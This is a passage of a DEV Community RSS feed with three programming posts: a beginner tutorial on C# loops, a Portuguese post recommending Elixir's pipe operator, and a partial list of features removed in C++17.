<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>C# loops</title>
      <author>Ishaan Sheikh</author>
      <pubDate>Fri, 02 Jul 2021 17:30:40 +0000</pubDate>
      <link>https://dev.to/sheikh_ishaan/c-loops-4o1d</link>
      <guid>https://dev.to/sheikh_ishaan/c-loops-4o1d</guid>
      <description>&lt;p&gt;In this article, we'll learn about how to use loops in C#.&lt;/p&gt;

&lt;p&gt;In C# there are 4 types of loops available - &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;for&lt;/li&gt;
&lt;li&gt;foreach&lt;/li&gt;
&lt;li&gt;while&lt;/li&gt;
&lt;li&gt;do-while &lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#the-raw-for-endraw-loop"&gt;
  &lt;/a&gt;
  The &lt;code&gt;for&lt;/code&gt; loop
&lt;/h2&gt;

&lt;p&gt;The for loop is a basic loop that is available in almost all programming languages. It executes a block of statements until a specified expression evaluates to false.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#syntax"&gt;
  &lt;/a&gt;
  Syntax
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initialValue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;statements&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above code executes the statements inside parentheses until the &lt;strong&gt;condition&lt;/strong&gt; evaluates to false.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#example"&gt;
  &lt;/a&gt;
  Example
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt; &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;++)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-raw-foreach-endraw-loop"&gt;
  &lt;/a&gt;
  The &lt;code&gt;foreach&lt;/code&gt; loop
&lt;/h2&gt;

&lt;p&gt;The foreach loop in C# is used to iterate over the instance of the type that implements the &lt;code&gt;IEnumerable&lt;/code&gt; or &lt;code&gt;IEnumerable&amp;lt;T&amp;gt;&lt;/code&gt; interface. In other words, it is used to iterate over an array or collection. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#syntax"&gt;
  &lt;/a&gt;
  Syntax
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="n"&gt;variable&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;statements&lt;/span&gt;&lt;span class="p"&gt;...;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#iterate-on-array"&gt;
  &lt;/a&gt;
  Iterate on Array
&lt;/h4&gt;

&lt;p&gt;In this example we'll use a simple array of integers.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above lines will print all the numbers in the list &lt;code&gt;numbers&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;1
2
3
4
5
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#iterate-on-collection"&gt;
  &lt;/a&gt;
  Iterate on Collection
&lt;/h4&gt;

&lt;p&gt;In this example, we are going to use collections.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Collections.Generic&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;people&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;"John"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"Smith"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"Josh"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;"Walton"&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;people&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The above lines will print all the names from the collection &lt;code&gt;people&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;John
Smith
Josh
Walton
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-raw-while-endraw-loop"&gt;
  &lt;/a&gt;
  The &lt;code&gt;while&lt;/code&gt; loop
&lt;/h2&gt;

&lt;p&gt;The while loop executes a block of statements while an expression evaluates to true.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#syntax"&gt;
  &lt;/a&gt;
  Syntax
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;statements&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#example"&gt;
  &lt;/a&gt;
  Example
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;++;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-raw-dowhile-endraw-loop"&gt;
  &lt;/a&gt;
  The &lt;code&gt;do-while&lt;/code&gt; loop
&lt;/h2&gt;

&lt;p&gt;The &lt;strong&gt;do-while&lt;/strong&gt; loop executes a block of statements while an expression evaluates to true. The only difference in this and while loop is that, it executes the block &lt;strong&gt;at least one time&lt;/strong&gt; since the condition is checked after the execution of the loop.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#syntax"&gt;
  &lt;/a&gt;
  Syntax
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="n"&gt;statements&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#example"&gt;
  &lt;/a&gt;
  Example
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;++;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>csharp</category>
      <category>tutorial</category>
      <category>programming</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Use canos (pipes) sempre que possível em Elixir!</title>
      <author>Elixir UTFPR</author>
      <pubDate>Fri, 02 Jul 2021 17:16:58 +0000</pubDate>
      <link>https://dev.to/elixir_utfpr/use-canos-pipes-sempre-que-possivel-em-elixir-25ci</link>
      <guid>https://dev.to/elixir_utfpr/use-canos-pipes-sempre-que-possivel-em-elixir-25ci</guid>
      <description>&lt;p&gt;Oi, pessoal!&lt;/p&gt;

&lt;p&gt;Recentemente fiz um &lt;a href="https://youtu.be/rryQ3DdpgiM"&gt;vídeo sobre Pipes em Elixir&lt;/a&gt;. Como sei que nem todos gostam de ver vídeos (eu estou entre estas pessoas), vou escrever um pouco sobre o que falei lá.&lt;/p&gt;

&lt;p&gt;Em primeiro lugar, preciso falar da Falácia do Espantalho. Um site muito bom sobre falácias lógicas é &lt;a href="https://yourlogicalfallacyis.com/"&gt;https://yourlogicalfallacyis.com/&lt;/a&gt;. Lá você encontra um texto sobre a falácia do espantalho que diz:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://yourlogicalfallacyis.com/br/espantalho"&gt;"Ao exagerar, distorcer, ou simplesmente inventar o argumento de alguém, torna-se muito mais fácil apresentar a sua própria posição como sendo razoável."&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Por que eu disse isso? Porque quando você entra na página da Elixir School (que eu adoro) sobre o &lt;a href="https://elixirschool.com/pt/lessons/basics/pipe-operator/"&gt;Operador Pipe&lt;/a&gt; está escrito "chamadas em funções podem ficar tão incorporadas a outras chamadas de função, tornando-se muito difícil de seguir" e aí eles dão o seguinte exemplo:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="n"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;baz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;other_function&lt;/span&gt;&lt;span class="p"&gt;()))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Bem, mesmo sem &lt;em&gt;pipe&lt;/em&gt; dá pra deixar o código acima bem mais legível. Como? Assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="n"&gt;valor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;other_function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;nome_significativo_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;valor&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;nome_significativo_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nome_significativo_1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;nome_significativo_3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nome_significativo_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nome_significativo_3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ou seja, o código acima talvez fique, dependendo da escolha dos "nomes significativos" das variáveis, até mais legível do que o exemplo com pipe utilizado na Elixir School:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="n"&gt;other_function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;new_function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;baz&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ou seja, eu acho que o pessoal da Elixir School usou um pouco da falácia do espantalho para justificar o pipe.&lt;/p&gt;

&lt;p&gt;Eu já sou meio chato em usar os pipes tudo numa mesma linha. OK, sei que no iex não tem muita escolha exceto fazer isto (colocar o pipe no fim da linha e pular para a próxima linha):&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;"Elixir rocks"&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; 
&lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upcase&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; 
&lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Mas não vou escrever sobre o que não gosto e sim sobre o que gosto. &lt;br&gt;
A tradução literal de &lt;em&gt;pipe&lt;/em&gt; é cano e usando o operador pipe.&lt;/p&gt;

&lt;p&gt;Na figura abaixo você pode ver como os dados fluem de uma função a outra através dos canos (pipes).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--z-FOV1sk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yrxfpvcn6isq0ad0cwfu.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--z-FOV1sk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yrxfpvcn6isq0ad0cwfu.jpeg" alt="Canos"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Neste exemplo eu mostrei como você pode usar IO.inspect para ver o que acontece após cada ação do pipe.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="no"&gt;Enum&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;take&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;IO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;label:&lt;/span&gt; &lt;span class="s2"&gt;"inicial"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Enum&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;IO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;label:&lt;/span&gt; &lt;span class="s2"&gt;"Após map"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Enum&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;IO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;label:&lt;/span&gt; &lt;span class="s2"&gt;"Após filter"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Enum&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;IO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;label:&lt;/span&gt; &lt;span class="s2"&gt;"Após sum"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Portanto, minha sugestão é: use o pipe sempre que possível em Elixir. Na minha opinião (é somente uma opinião, claro), o pipe deixa o código mais legível!&lt;/p&gt;

&lt;p&gt;Cover Photo by &lt;a href="https://unsplash.com/@kylejglenn"&gt;Kyle Glenn&lt;/a&gt; on &lt;a href="https://unsplash.com/s/photos/pipe?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>elixir</category>
      <category>programacao</category>
    </item>
    <item>
      <title>C++ Removed Features</title>
      <author>Animesh</author>
      <pubDate>Fri, 02 Jul 2021 17:15:44 +0000</pubDate>
      <link>https://dev.to/animeshmaru/c-removed-features-f86</link>
      <guid>https://dev.to/animeshmaru/c-removed-features-f86</guid>
      <description>&lt;p&gt;With the new version of C++17 many new functions introduced but some features are removed or deprecated.😊&lt;/p&gt;

&lt;p&gt;These are listed below :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Removal of deprecated operator ++&lt;/li&gt;
&lt;li&gt;Removal of registers&lt;/li&gt;
&lt;li&gt;Removal of auto_ptr&lt;/li&gt;
&lt;li&gt;Trigraphs&lt;/li&gt;
&lt;li&gt;throw(typeid)&lt;/li&gt;
&lt;li&gt;Allocator support in std::function&lt;/li&gt;
&lt;li&gt;std::pointer_to_unary_function and 
std::pointer_to_binary_function&lt;/li&gt;
&lt;li&gt;std::binder1st and std::binder2nd&lt;/li&gt;
&lt;li&gt;std::bind1st and std::bind2nd&lt;/li&gt;
&lt;li&gt;Other functions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;1.   REMOVAL OF DEPRECATED OPERATOR ++&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Postfix and prefix Increment (++) expressions are now not valid for &lt;strong&gt;bool&lt;/strong&gt; operands, since pre-fix and post-fix operator++ was overloaded for type bool but In both cases, the return value for a bool argument is true. The bool type does not support the full set of arithmetic types. Since from the launch of C++98 this change was much awaiting. In new version of C++17 it is no longer considered an arithmetic type and these operators have been deprecated.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
&lt;strong&gt;std::exchange&lt;/strong&gt; can be used as alternative for this, but only where post-fix operator has valid uses. Exchange function replaces the value of object with new value and returns the old value of object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.    REMOVAL OF REGISTERS&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;Long back, in C++11 register keyword was deprecated. Register keyword specifies or gives a hint to compiler that the variable can be put in a register for fast access or these variables might be heavily used so that it can do optimization by storing it in a CPU register. But compiler implicit do optimizations and hint was rarely used. Therefore in new version register keyword is removed, although keyword is still reserved for future versions.&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;syntax :&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="k"&gt;register&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"Bye Bye register :)"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;There is no alternative for register as compiler does the same work automatically. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3.    REMOVAL OF AUTO_PTR&lt;/strong&gt; &lt;/p&gt;

